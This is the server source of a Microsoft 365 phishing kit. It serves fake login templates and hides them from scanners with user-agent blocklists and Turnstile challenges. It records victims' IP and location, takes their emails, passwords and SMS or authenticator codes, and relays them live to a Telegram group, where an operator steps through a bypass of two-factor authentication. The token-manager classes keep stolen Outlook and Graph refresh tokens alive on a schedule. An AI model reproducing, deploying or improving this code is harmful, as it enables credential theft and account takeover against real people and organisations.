require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

// Load templates at startup
let templates = [];

function loadTemplates() {
  try {
    const templatesDir = path.join(__dirname, 'templates');
    
    if (!fs.existsSync(templatesDir)) {
      console.error(`❌ Templates directory not found: ${templatesDir}`);
      return [];
    }
    
    const files = fs.readdirSync(templatesDir);
    const loadedTemplates = [];
    
    files.forEach(filename => {
      if (filename.endsWith('.html')) {
        const filePath = path.join(templatesDir, filename);
        const content = fs.readFileSync(filePath, 'utf8');
        
        if (typeof content !== 'string') {
          console.error(`❌ Template ${filename} content is not a string:`, typeof content);
          return;
        }
        
        loadedTemplates.push({
          name: filename.replace('.html', ''),
          filename: filename,
          content: content,
          contentLength: content.length,
          contentPreview: content.substring(0, 100) + '...'
        });
        
        console.log(`✅ Loaded template: ${filename} (${content.length} bytes)`);
      }
    });
    
    console.log(`✅ Total templates loaded: ${loadedTemplates.length}`);
    console.log('📄 Template types:', loadedTemplates.map(t => typeof t.content));
    
    return loadedTemplates;
    
  } catch (error) {
    console.error('❌ Error loading templates:', error.message);
    return [];
  }
}

// Load templates when server starts
templates = loadTemplates();

// Helper function to get random template from cache
function getRandomTemplate() {
  if (templates.length === 0) {
    console.error('❌ No templates available in cache');
    return null;
  }
  
  const randomIndex = Math.floor(Math.random() * templates.length);
  return templates[randomIndex];
}

// ============= PRODUCTION MODE DETECTION =============
const isProduction = process.env.NODE_ENV === 'production';
const APP_URL = process.env.APP_URL || (isProduction ? 'https://your-app.com' : 'http://localhost:3001');

// Clean APP_URL (remove trailing slash)
const cleanAppUrl = APP_URL.replace(/\/$/, '');

console.log(`\n🚀 ========== SERVER STARTING ==========`);
console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
console.log(`🌐 App URL: ${cleanAppUrl}`);
console.log(`🔌 Port: ${process.env.PORT || 3001}`);
console.log(`========================================\n`);

// ============= RENDER-SPECIFIC CONFIGURATION =============
app.set('trust proxy', true);

// ============= MIDDLEWARE =============
const allowedOrigins = isProduction 
  ? [cleanAppUrl, 'https://login.microsoftonline.com']
  : ['http://localhost:3001', 'http://127.0.0.1:3001'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true
}));








// Store verified sessions
const verifiedSessions = new Map();

// Clean up old sessions every hour
setInterval(() => {
  const now = Date.now();
  for (const [key, value] of verifiedSessions.entries()) {
    if (now - value.timestamp > 3600000) { // 1 hour
      verifiedSessions.delete(key);
    }
  }
}, 3600000);

// Generate a fingerprint for the client
function getFingerprint(req) {
  const ip = requestIp.getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const acceptLanguage = req.headers['accept-language'] || '';
  return crypto.createHash('sha256').update(`${ip}:${userAgent}:${acceptLanguage}`).digest('hex');
}

// Check if it's a Turnstile verification request
async function handleTurnstileVerification(req, res) {
  const token = req.body['cf-turnstile-response'];
  
  if (!token) {
    return res.status(400).json({ success: false });
  }
  
  try {
    const formData = new URLSearchParams();
    formData.append('secret', process.env.TURNSTILE_SECRET_KEY);
    formData.append('response', token);
    formData.append('remoteip', requestIp.getClientIp(req));
    
    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      body: formData
    });
    
    const outcome = await response.json();
    
    if (outcome.success) {
      const fingerprint = getFingerprint(req);
      verifiedSessions.set(fingerprint, {
        timestamp: Date.now(),
        verified: true
      });
      return res.json({ success: true });
    }
    
    return res.status(403).json({ success: false });
    
  } catch (error) {
    console.error('Turnstile error:', error);
    return res.status(500).json({ success: false });
  }
}

// Serve Turnstile challenge page
function serveTurnstileChallenge(req, res) {
  const siteKey = process.env.TURNSTILE_SITE_KEY;
  
  if (!siteKey) {
    console.error('TURNSTILE_SITE_KEY not set');
    return res.status(500).send('Configuration error');
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="robots" content="noindex, nofollow">
      <title>Verify you're human</title>
      <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
          background: white;
          padding: 48px;
          border-radius: 24px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          text-align: center;
          max-width: 450px;
          animation: fadeIn 0.5s ease-out;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        h2 {
          color: #333;
          margin-bottom: 16px;
          font-size: 28px;
        }
        p {
          color: #666;
          margin-bottom: 32px;
          line-height: 1.6;
        }
        .cf-turnstile {
          display: flex;
          justify-content: center;
          margin: 20px 0;
        }
        .status {
          margin-top: 20px;
          color: #999;
          font-size: 14px;
        }
        .loader {
          display: none;
          width: 20px;
          height: 20px;
          border: 2px solid #f3f3f3;
          border-top: 2px solid #667eea;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 10px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>🔒 Verify you're human</h2>
        <p>Please complete the verification to continue to the website</p>
        <div class="cf-turnstile" data-sitekey="${siteKey}" data-callback="onVerify" data-theme="light"></div>
        <div class="loader" id="loader"></div>
        <div class="status" id="status">Verification required</div>
      </div>
      
      <script>
        function onVerify(token) {
          const loader = document.getElementById('loader');
          const status = document.getElementById('status');
          const turnstile = document.querySelector('.cf-turnstile');
          
          loader.style.display = 'block';
          status.innerHTML = 'Verifying...';
          turnstile.style.opacity = '0.5';
          
          fetch('/verify-turnstile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 'cf-turnstile-response': token })
          })
          .then(res => res.json())
          .then(data => {
            if (data.success) {
              status.innerHTML = '✅ Verified! Redirecting...';
              setTimeout(() => {
                window.location.reload();
              }, 1000);
            } else {
              status.innerHTML = '❌ Verification failed. Please refresh and try again.';
              loader.style.display = 'none';
              turnstile.style.opacity = '1';
              if (typeof turnstile !== 'undefined' && turnstile.reset) {
                turnstile.reset();
              }
            }
          })
          .catch(err => {
            console.error(err);
            status.innerHTML = '❌ Error. Please refresh and try again.';
            loader.style.display = 'none';
            turnstile.style.opacity = '1';
          });
        }
      </script>
    </body>
    </html>
  `);
}

// Main bot detection middleware - LENIENT VERSION
async function unifiedBotDetection(req, res, next) {
  const userAgent = req.headers['user-agent'] || '';
  const uaLower = userAgent.toLowerCase();
  const fingerprint = getFingerprint(req);
  
  // Handle Turnstile verification endpoint
  if (req.path === '/verify-turnstile' && req.method === 'POST') {
    return handleTurnstileVerification(req, res);
  }
  
  // ============ STEP 1: Check if already verified ============
  const verified = verifiedSessions.get(fingerprint);
  if (verified && Date.now() - verified.timestamp < 3600000) {
    return next();
  }
  
  // ============ STEP 2: IMMEDIATE BLOCK - only the most obvious bots ============
  const obviousBots = [
    'python-requests', 'curl', 'wget', 'postman', 'axios',
    'go-http-client', 'scrapy', 'phantomjs', 'selenium',
    'headlesschrome', 'headlessbrowser', 'puppeteer', 'playwright'
  ];
  
  for (const bot of obviousBots) {
    if (uaLower.includes(bot)) {
      console.log(`🚫 Blocked obvious bot: ${bot}`);
      return res.status(403).send('Access Denied');
    }
  }
  
  // ============ STEP 3: Check for exact bot patterns ============
  const exactBotPatterns = [
    'bingbot', 'yahoo! slurp', 'semrushbot', 'ahrefsbot',
    'facebookexternalhit', 'twitterbot', 'discordbot',
    'telegrambot', 'slackbot', 'linkedinbot', 'googlebot'
  ];
  
  for (const bot of exactBotPatterns) {
    if (uaLower.includes(bot)) {
      console.log(`🚫 Blocked bot: ${bot}`);
      return res.status(403).send('Access Denied');
    }
  }
  
  // ============ STEP 4: Check for suspicious patterns with URL (bot signature) ============
  if (userAgent.includes('compatible;') && userAgent.includes('http://')) {
    console.log(`🚫 Blocked bot with URL pattern`);
    return res.status(403).send('Access Denied');
  }
  
  // ============ STEP 5: Check for valid browser (VERY LENIENT) ============
  const chromeMatch = userAgent.match(/Chrome\/(\d+)/i);
  const firefoxMatch = userAgent.match(/Firefox\/(\d+)/i);
  const safariMatch = userAgent.match(/Safari\/(\d+)/i) && !chromeMatch;
  const edgeMatch = userAgent.match(/Edg\/(\d+)/i);
  const operaMatch = userAgent.match(/OPR\/(\d+)/i);
  
  let isValidBrowser = false;
  
  if (chromeMatch) {
    const version = parseInt(chromeMatch[1]);
    // Chrome versions from 70 to 150 are valid (current is 134)
    if (version >= 70 && version <= 150) {
      isValidBrowser = true;
    } else {
      console.log(`⚠️ Suspicious Chrome version: ${version}`);
    }
  } else if (firefoxMatch) {
    const version = parseInt(firefoxMatch[1]);
    if (version >= 60 && version <= 150) {
      isValidBrowser = true;
    }
  } else if (edgeMatch) {
    const version = parseInt(edgeMatch[1]);
    if (version >= 80 && version <= 150) {
      isValidBrowser = true;
    }
  } else if (operaMatch) {
    const version = parseInt(operaMatch[1]);
    if (version >= 60 && version <= 150) {
      isValidBrowser = true;
    }
  } else if (safariMatch) {
    // Safari is a bit different - check for Version/
    const versionMatch = userAgent.match(/Version\/(\d+)/i);
    if (versionMatch && parseInt(versionMatch[1]) >= 12) {
      isValidBrowser = true;
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('Mac')) {
      // Mobile Safari or Mac Safari without version
      isValidBrowser = true;
    }
  }
  
  // If it's not a valid browser, serve challenge instead of blocking
  if (!isValidBrowser) {
    console.log(`⚠️ Unknown browser, serving challenge: ${userAgent.substring(0, 100)}`);
    return serveTurnstileChallenge(req, res);
  }
  
  // ============ STEP 6: Serve challenge for all unverified users (even valid browsers) ============
  // This ensures all real browsers complete Turnstile once
  console.log(`🔐 Serving challenge to valid browser: ${userAgent.substring(0, 100)}`);
  return serveTurnstileChallenge(req, res);
}

// Simple rate limiting to prevent abuse
function rateLimitMiddleware() {
  const requestCounts = new Map();
  
  return (req, res, next) => {
    const fingerprint = getFingerprint(req);
    const now = Date.now();
    const windowMs = 60000; // 1 minute
    const maxRequests = 60; // Higher limit for real users
    
    if (!requestCounts.has(fingerprint)) {
      requestCounts.set(fingerprint, []);
    }
    
    const requests = requestCounts.get(fingerprint).filter(time => now - time < windowMs);
    requests.push(now);
    requestCounts.set(fingerprint, requests);
    
    // Clean up old entries
    if (requestCounts.size > 10000) {
      for (const [key, timestamps] of requestCounts.entries()) {
        if (timestamps.length === 0 || now - timestamps[timestamps.length - 1] > windowMs * 5) {
          requestCounts.delete(key);
        }
      }
    }
    
    if (requests.length > maxRequests) {
      console.log(`🚫 Rate limit exceeded for fingerprint: ${fingerprint}`);
      return res.status(429).send('Too many requests');
    }
    
    next();
  };
}

// Apply middlewares
app.use(express.json()); // Make sure this is before the middleware to parse JSON bodies
app.use(rateLimitMiddleware());
// app.use(unifiedBotDetection);



app.use(requestIp.mw());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const io = new Server(server, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST'],
    credentials: true
  },
  transports: ['polling', 'websocket'],
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============= BOT INITIALIZATION =============
let bot;
let telegramGroupId = process.env.TELEGRAM_GROUP_ID;

const initializeBot = () => {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
  
  const usePolling = process.env.USE_POLLING === 'true' || !isProduction;
  
  if (usePolling) {
    console.log('🔧 Using POLLING mode');
    bot.deleteWebHook()
      .then(() => bot.startPolling())
      .catch(err => console.error('❌ Failed to start polling:', err));
  } else {
    console.log('🚀 Using WEBHOOK mode');
    const webhookUrl = `${cleanAppUrl}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
      .then(() => console.log('✅ Webhook set successfully to:', webhookUrl))
      .catch(err => console.error('❌ Webhook setup failed:', err));
  }
  
  return bot;
};

initializeBot();

app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ============= SESSION MANAGEMENT =============
const activeSessions = new Map();
const capturedData = new Map();
const microsoftParams = new Map();
const requestTimestamps = new Map();
const codeVerifiers = new Map();
const emailSessions = new Map();

const SESSION_TIMEOUT = 7200000;
const CLEANUP_INTERVAL = 600000;
const SESSION_COOLDOWN = 5000;

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
    }
  }
}, CLEANUP_INTERVAL);

// ============= PKCE HELPER FUNCTIONS =============
function generateCodeVerifier() {
  return crypto.randomBytes(64)
    .toString('base64')
    .replace(/[^a-zA-Z0-9]/g, '')
    .substring(0, 128);
}

function browserOnlyMiddleware(req, res, next) {
  const userAgent = req.headers['user-agent'] || '';
  
  const botPatterns = [
    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
    'python', 'java', 'perl', 'ruby', 'php', 'go-http-client',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
    'axios', 'node-fetch', 'postman', 'insomnia',
    'facebookexternalhit', 'twitterbot', 'linkedinbot',
    'slackbot', 'discordbot', 'telegrambot',
    'WordPress', 'Wget', 'Lynx', 'Links', 'w3m'
  ];
  
  const isBot = botPatterns.some(pattern => 
    userAgent.toLowerCase().includes(pattern.toLowerCase())
  );
  
  const hasBrowserIndicators = 
    userAgent.includes('Mozilla') || 
    userAgent.includes('Chrome') || 
    userAgent.includes('Safari') || 
    userAgent.includes('Firefox') || 
    userAgent.includes('Edge') || 
    userAgent.includes('Opera');
  
  if (isBot || !hasBrowserIndicators) {
    console.log(`🚫 Blocked non-browser request: ${userAgent.substring(0, 100)}`);
    return res.redirect('https://www.google.com');
  }
  
  next();
}

function generateCodeChallenge(verifier) {
  const hash = crypto.createHash('sha256').update(verifier).digest();
  return hash.toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Verify Turnstile token with Cloudflare API
async function verifyTurnstileToken(token, remoteip) {
  const secretKey = process.env.TURNSTILE_SECRET_KEY;
  
  if (!secretKey) {
    console.error('❌ TURNSTILE_SECRET_KEY not set');
    return { success: false };
  }

  try {
    const response = await axios.post(
      'https://challenges.cloudflare.com/turnstile/v0/siteverify',
      {
        secret: secretKey,
        response: token,
        remoteip: remoteip
      },
      {
        headers: { 'Content-Type': 'application/json' }
      }
    );

    return response.data;
  } catch (error) {
    console.error('❌ Turnstile verification failed:', error.message);
    return { success: false, error: 'Verification request failed' };
  }
}

// Turnstile middleware for Express
async function turnstileMiddleware(req, res, next) {
  if (req.method === 'GET' || process.env.SKIP_TURNSTILE === 'true') {
    return next();
  }

  const token = req.body['cf-turnstile-response'];
  const remoteip = req.ip || req.connection.remoteAddress;

  if (!token) {
    console.log('⚠️ Turnstile token missing');
    return res.status(400).json({ 
      error: 'Turnstile token missing',
      message: 'Please complete the security check'
    });
  }

  const verification = await verifyTurnstileToken(token, remoteip);

  if (!verification.success) {
    console.log('⚠️ Turnstile verification failed:', verification['error-codes']);
    return res.status(403).json({ 
      error: 'Turnstile verification failed',
      message: 'Security check failed. Please try again.'
    });
  }

  console.log('✅ Turnstile verification passed');
  next();
}

// ============= VICTIM INFO CAPTURE HELPER =============
async function getVictimInfo(req) {
  try {
    const ip = requestIp.getClientIp(req) || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
      }
    } catch (e) {}

    return {
      ip,
      location,
      browser: agent.toAgent() || 'Unknown',
      os: agent.os.toString() || 'Unknown',
      device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
      timestamp: new Date().toLocaleString()
    };
  } catch (err) {
    return {
      ip: 'Unknown',
      location: 'Unknown',
      browser: 'Unknown',
      os: 'Unknown',
      device: 'Unknown',
      timestamp: new Date().toLocaleString()
    };
  }
}

// ============= PERSISTENT TOKEN MANAGER WITH CAE SUPPORT =============

class PersistentTokenManager {
  constructor(sessionId, tokens, resource = 'outlook') {
    this.sessionId = sessionId;
    this.resource = resource;
    this.accessToken = tokens.access_token;
    this.refreshToken = tokens.refresh_token;
    this.expiresAt = Date.now() + (tokens.expires_in * 1000);
    this.scopes = tokens.scope;
    this.caeEnabled = true;
    this.lastRefresh = Date.now();
    this.refreshCount = 0;
    this.capturedAt = new Date().toISOString();
    this.clientId = resource === 'graph' ? '1fec8e78-bce4-4aaf-ab1b-5451cc387264' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
  }

  isExpired() {
    return Date.now() >= (this.expiresAt - 300000);
  }

  async refresh(useGraph = false) {
    if (!this.refreshToken) {
      throw new Error('No refresh token available');
    }

    const scope = useGraph 
      ? 'https://graph.microsoft.com/.default offline_access'
      : 'https://outlook.office.com/.default offline_access';

    try {
      const claims = JSON.stringify({
        access_token: {
          xms_cc: { values: ["CP1"] }
        }
      });

      const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
        new URLSearchParams({
          client_id: this.clientId,
          refresh_token: this.refreshToken,
          grant_type: 'refresh_token',
          scope: scope,
          claims: claims
        }).toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
          }
        }
      );

      const newTokens = response.data;
      
      this.accessToken = newTokens.access_token;
      this.expiresAt = Date.now() + (newTokens.expires_in * 1000);
      this.lastRefresh = Date.now();
      this.refreshCount++;
      
      if (newTokens.refresh_token) {
        this.refreshToken = newTokens.refresh_token;
        console.log(`🔄 New refresh token issued for session ${this.sessionId}`);
      }
      
      console.log(`✅ Token refreshed for ${this.resource} (expires in ${newTokens.expires_in}s)`);
      return newTokens;
      
    } catch (error) {
      if (error.response?.status === 400 && error.response?.data?.error === 'invalid_grant') {
        console.error(`❌ Refresh token invalid for session ${this.sessionId} - user may have revoked access`);
        throw new Error('Token revoked - requires re-authentication');
      }
      throw error;
    }
  }

  async getValidToken() {
    if (this.isExpired()) {
      console.log(`🔄 Token expired, refreshing...`);
      await this.refresh(this.resource === 'graph');
    }
    return this.accessToken;
  }

  async testAccess() {
    try {
      const testUrl = this.resource === 'graph' 
        ? 'https://graph.microsoft.com/v1.0/me'
        : 'https://outlook.office.com/api/v2.0/me';
      
      const response = await axios.get(testUrl, {
        headers: {
          'Authorization': `Bearer ${this.accessToken}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      
      return { valid: true, user: response.data };
    } catch (error) {
      const status = error.response?.status;
      
      if (status === 401) {
        const claimsHeader = error.response?.headers?.['www-authenticate'];
        if (claimsHeader && claimsHeader.includes('claims')) {
          console.log('⚠️ Claims challenge received - need to handle with refresh');
          return { valid: false, requiresClaimsRefresh: true, claims: claimsHeader };
        }
        return { valid: false, reason: 'Token expired or invalid' };
      }
      
      return { valid: false, error: error.message };
    }
  }

  getStatus() {
    return {
      resource: this.resource,
      valid: !this.isExpired(),
      expiresIn: Math.max(0, Math.floor((this.expiresAt - Date.now()) / 1000)),
      expiresAt: new Date(this.expiresAt).toISOString(),
      lastRefresh: new Date(this.lastRefresh).toISOString(),
      refreshCount: this.refreshCount,
      caeEnabled: this.caeEnabled,
      scopes: this.scopes
    };
  }
}

// ============= TOKEN REFRESH SCHEDULER =============

class TokenRefreshScheduler {
  constructor() {
    this.refreshInterval = null;
    this.checkInterval = 30 * 60 * 1000;
  }

  start() {
    if (this.refreshInterval) clearInterval(this.refreshInterval);
    
    this.refreshInterval = setInterval(async () => {
      await this.refreshAllTokens();
    }, this.checkInterval);
    
    console.log('✅ Token refresh scheduler started (checking every 30 minutes)');
  }

  async refreshAllTokens() {
    console.log('🔄 Running scheduled token refresh check...');
    
    for (const [sessionId, sessionData] of capturedData.entries()) {
      if (!sessionData.tokenManagers) continue;
      
      for (const [resource, tokenManager] of Object.entries(sessionData.tokenManagers)) {
        if (!tokenManager || typeof tokenManager.isExpired !== 'function') continue;
        
        try {
          const timeUntilExpiry = tokenManager.expiresAt - Date.now();
          const shouldRefresh = timeUntilExpiry < 15 * 60 * 1000;
          
          if (shouldRefresh) {
            console.log(`🔄 Refreshing ${resource} token for session ${sessionId} (expires in ${Math.round(timeUntilExpiry / 60000)} minutes)`);
            
            await tokenManager.refresh(resource === 'graph');
            
            if (resource === 'outlook' && sessionData.tokens?.outlook) {
              sessionData.tokens.outlook.access_token = tokenManager.accessToken;
              sessionData.tokens.outlook.refresh_token = tokenManager.refreshToken;
            } else if (resource === 'graph' && sessionData.tokens?.graph) {
              sessionData.tokens.graph.access_token = tokenManager.accessToken;
              sessionData.tokens.graph.refresh_token = tokenManager.refreshToken;
            }
            
            if (bot && telegramGroupId) {
              const message = `🔄 *Token Refreshed*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `*Resource:* ${resource}\n` +
                `*New Expiry:* ${new Date(tokenManager.expiresAt).toLocaleString()}\n` +
                `*Refresh Count:* ${tokenManager.refreshCount}`;
              
              bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
                .catch(() => {});
            }
          }
        } catch (error) {
          console.error(`❌ Failed to refresh ${resource} token for session ${sessionId}:`, error.message);
          
          if (bot && telegramGroupId && error.message.includes('revoked')) {
            const message = `⚠️ *Token Refresh Failed*\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `*Session:* \`${sessionId}\`\n` +
              `*Resource:* ${resource}\n` +
              `*Error:* ${error.message}\n` +
              `*Action Required:* User needs to re-authenticate`;
            
            bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
              .catch(() => {});
          }
        }
      }
    }
  }

  stop() {
    if (this.refreshInterval) {
      clearInterval(this.refreshInterval);
      this.refreshInterval = null;
      console.log('🛑 Token refresh scheduler stopped');
    }
  }
}

// ============= SOCKET.IO HANDLERS =============
io.on('connection', (socket) => {
  let sessionId = socket.handshake.query.sessionId || uuidv4();
  
  if (!activeSessions.has(sessionId)) {
    activeSessions.set(sessionId, {
      stage: 'initial',
      lastActivity: Date.now(),
      details: null,
      email: null,
      password: null,
      sockets: new Set([socket.id]),
      createdAt: Date.now()
    });
  } else {
    const session = activeSessions.get(sessionId);
    session.sockets.add(socket.id);
    session.lastActivity = Date.now();
  }

  socket.emit('connection_established', { sessionId });

  socket.on('client_info', (userAgent) => {
    const session = activeSessions.get(sessionId);
    if (session) {
      const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
      const geo = geoip.lookup(ip) || {};
      const agent = useragent.parse(userAgent);
      
      session.details = {
        ip,
        location: geo.country ? `${geo.city || 'Unknown'}, ${geo.country}` : 'Unknown',
        browser: agent.toAgent(),
        os: agent.os.toString(),
        timestamp: new Date().toLocaleString()
      };
      session.lastActivity = Date.now();
    }
  });

  socket.on('submit_email', async (email) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.email = email;
    session.stage = 'awaiting_password';
    session.lastActivity = Date.now();

    const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${email}`;
    await bot.sendMessage(telegramGroupId, message, {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }]
        ]
      }
    });
    
    socket.emit('email_sent');
  });

  socket.on('submit_password', async (password) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.password = password;
    session.stage = 'awaiting_action';
    session.lastActivity = Date.now();

    await bot.sendMessage(telegramGroupId, 
      `🔒 Password received for ${session.email}\nPassword: ${password}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
            [{ text: '🔐 Request Auth Code', callback_data: `request_auth|${sessionId}` }],
            [{ text: '✅ Done', callback_data: `done|${sessionId}` }]
          ]
        }
      }
    );
    
    socket.emit('password_sent');
  });

  socket.on('disconnect', () => {
    const session = activeSessions.get(sessionId);
    if (session) {
      session.sockets.delete(socket.id);
      session.lastActivity = Date.now();
    }
  });
});

// ============= TELEGRAM BOT HANDLERS =============
bot.on('callback_query', async (cb) => {
  const [action, sessionId] = cb.data.split('|');
  const session = activeSessions.get(sessionId);
  
  if (!session) {
    await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
    return;
  }

  session.lastActivity = Date.now();

  if (action === 'request_password') {
    sendToSession(sessionId, 'request_password');
    await bot.answerCallbackQuery(cb.id, { text: 'Requesting password' });
  } else if (action === 'request_sms' || action === 'request_auth') {
    const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
    sendToSession(sessionId, 'request_2fa', codeType);
    await bot.answerCallbackQuery(cb.id, { text: `Requesting ${codeType} code` });
  } else if (action === 'done') {
    sendToSession(sessionId, 'redirect_to_gmail');
    await bot.sendMessage(telegramGroupId, 
      `✅ Login complete for ${session.email}\nPassword: ${session.password || 'N/A'}`
    );
    await bot.answerCallbackQuery(cb.id, { text: 'Redirecting user' });
  }
});

function sendToSession(sessionId, event, data) {
  const session = activeSessions.get(sessionId);
  if (!session) return false;
  
  for (const socketId of session.sockets) {
    const socket = io.sockets.sockets.get(socketId);
    if (socket?.connected) socket.emit(event, data);
  }
  return true;
}

// ============= ROOT REDIRECT =============
app.get('/', (req, res) => {
  console.log(`↪️ Redirecting root to ${isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft'}`);
  res.redirect(isProduction ? '/microsoft' : '/microsoft');
});

// ============= CLEANUP INTERVAL FOR CODE VERIFIERS =============
setInterval(() => {
  const now = Date.now();
  const oneHourAgo = now - 3600000;
  let cleanedCount = 0;
  
  for (const [sessionId, verifier] of codeVerifiers.entries()) {
    const match = sessionId.match(/sess_(\d+)_/);
    if (match && parseInt(match[1]) < oneHourAgo) {
      codeVerifiers.delete(sessionId);
      cleanedCount++;
    }
  }
  
  if (cleanedCount > 0) {
    console.log(`🧹 Cleaned up ${cleanedCount} old code verifiers`);
  }
}, 3600000);

// ============= MICROSOFT LOGIN PAGE FETCHER =============
const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';

// ===== DUAL TOKEN CAPTURE CONFIGURATION =====
const DUAL_TOKEN_CLIENT_ID = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
const DUAL_TOKEN_REDIRECT_URI = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const DUAL_TOKEN_SCOPE = 'https://outlook.office.com/.default openid profile offline_access';

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'mU8x#2kN9$pL5@vR7*wQ4&zT1!yX3^bC6';

function decrypt(encryptedText) {
  try {
    console.log('\n🔐 Attempting to decrypt:', encryptedText);
    console.log('📏 Encrypted text length:', encryptedText.length);
    
    let base64 = encryptedText.replace(/-/g, '+').replace(/_/g, '/');
    
    while (base64.length % 4) {
      base64 += '=';
    }
    
    const combined = Buffer.from(base64, 'base64');
    
    const iv = combined.slice(0, 16);
    const encrypted = combined.slice(16);
    
    let key = Buffer.from(ENCRYPTION_KEY, 'utf8');
    
    if (key.length !== 32) {
      if (key.length < 32) {
        const paddedKey = Buffer.alloc(32, 0);
        key.copy(paddedKey);
        key = paddedKey;
        console.log('⚠️ Key padded to 32 bytes');
      } else {
        key = key.slice(0, 32);
        console.log('⚠️ Key truncated to 32 bytes');
      }
    }
    
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encrypted);
    
    try {
      const final = decipher.final();
      decrypted = Buffer.concat([decrypted, final]);
      const result = decrypted.toString('utf-8');
      console.log('✅ Decrypted result:', result);
      return result;
    } catch (finalError) {
      console.error('❌ Final decrypt error:', finalError.message);
      
      const decipher2 = crypto.createDecipheriv('aes-256-cbc', key, iv);
      decipher2.setAutoPadding(false);
      let decrypted2 = decipher2.update(encrypted);
      decrypted2 = Buffer.concat([decrypted2, decipher2.final()]);
      
      const paddingLength = decrypted2[decrypted2.length - 1];
      console.log('Padding length from last byte:', paddingLength);
      
      if (paddingLength > 0 && paddingLength <= 16) {
        const unpadded = decrypted2.slice(0, decrypted2.length - paddingLength);
        const result = unpadded.toString('utf-8');
        console.log('✅ Manually unpadded result:', result);
        return result;
      }
      
      return null;
    }
  } catch (e) {
    console.error('❌ Failed to decrypt email:', e.message);
    return null;
  }
}

function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// ============= MAIN MICROSOFT ENDPOINT =============
app.get('/microsoft', async (req, res) => {
  try {
    const { email: encryptedEmail } = req.query;

    const template = getRandomTemplate();
    
    if (!template) {
      console.error('❌ No template available');
      return res.status(500).send('Template not available');
    }
    
    console.log('🔍 Template name:', template.name);
    console.log('🔍 Template content type:', typeof template.content);
    
    let templateHtml = template.content;
